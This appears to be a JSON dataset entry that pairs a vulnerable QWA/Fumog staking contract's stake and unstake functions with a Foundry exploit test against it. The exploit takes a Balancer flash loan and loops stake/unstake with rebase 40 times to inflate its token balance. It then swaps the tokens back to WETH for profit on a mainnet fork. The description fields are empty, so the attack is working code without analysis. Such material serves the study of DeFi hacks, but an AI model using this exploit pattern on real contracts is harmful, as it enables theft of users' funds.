[
  {
    "contract/interface": "IStaking",
    "source_type": "victim_contract",
    "function_name": "stake",
    "original_code": "    function stake(address _to, uint256 _amount) external {\n        rebase();\n        QWA.transferFrom(msg.sender, address(this), _amount);\n        sQWA.transfer(_to, _amount);\n    }\n\n    /// @notice redeem sQWA for QWA\n    /// @param _to address\n    /// @param _amount uint\n    function unstake(address _to, uint256 _amount, bool _rebase) external {\n        if (_rebase) rebase();\n        sQWA.transferFrom(msg.sender, address(this), _amount);\n        require(\n            _amount <= QWA.balanceOf(address(this)),\n            \"Insufficient QWA balance in contract\"\n        );\n        QWA.transfer(_to, _amount);\n    }\n\n    ///@notice Trigger rebase if epoch over\n",
    "description": ""
  },
  {
    "contract/interface": "IStaking",
    "source_type": "victim_contract",
    "function_name": "unstake",
    "original_code": "    function unstake(address _to, uint256 _amount, bool _rebase) external {\n        if (_rebase) rebase();\n        sQWA.transferFrom(msg.sender, address(this), _amount);\n        require(\n            _amount <= QWA.balanceOf(address(this)),\n            \"Insufficient QWA balance in contract\"\n        );\n        QWA.transfer(_to, _amount);\n    }\n\n    ///@notice Trigger rebase if epoch over\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "receiveFlashLoan",
    "original_code": "    function receiveFlashLoan(\n        address[] memory, /*tokens*/\n        uint256[] memory amounts,\n        uint256[] memory feeAmounts,\n        bytes memory userData\n    ) external {\n        WETH.approve(address(Router), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(WETH);\n        path[1] = address(Fumog);\n        Router.swapExactTokensForTokens(amounts[0], 0, path, address(this), block.timestamp);\n        Fumog.approve(address(QWAStaking), type(uint256).max);\n        Sfumog.approve(address(QWAStaking), type(uint256).max);\n\n        uint8 i = 0;\n        while (i < uint8(userData[0])) {\n            i += 1;\n            uint256 amountJump = Fumog.balanceOf(address(this));\n            QWAStaking.stake(address(this), amountJump);\n            uint256 amountSJump = Sfumog.balanceOf(address(this));\n            QWAStaking.unstake(address(this), amountSJump, true);\n        }\n\n        Fumog.approve(address(Router), type(uint256).max);\n        uint256 amount = Fumog.balanceOf(address(this));\n        // emit log_named_decimal_uint(\"Fumog token balance after exploit\", amount, Fumog.decimals());\n        path[0] = address(Fumog);\n        path[1] = address(WETH);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);\n        WETH.transfer(address(balancer), amounts[0] + feeAmounts[0]);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 18_070_348);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        address[] memory token = new address[](1);\n        token[0] = address(WETH);\n        uint256[] memory amount = new uint256[](1);\n        amount[0] = 5 ether;\n        balancer.flashLoan(address(this), token, amount, hex\"28\");\n        emit log_named_decimal_uint(\"[End] Attacker WETH after exploit\", WETH.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  }
]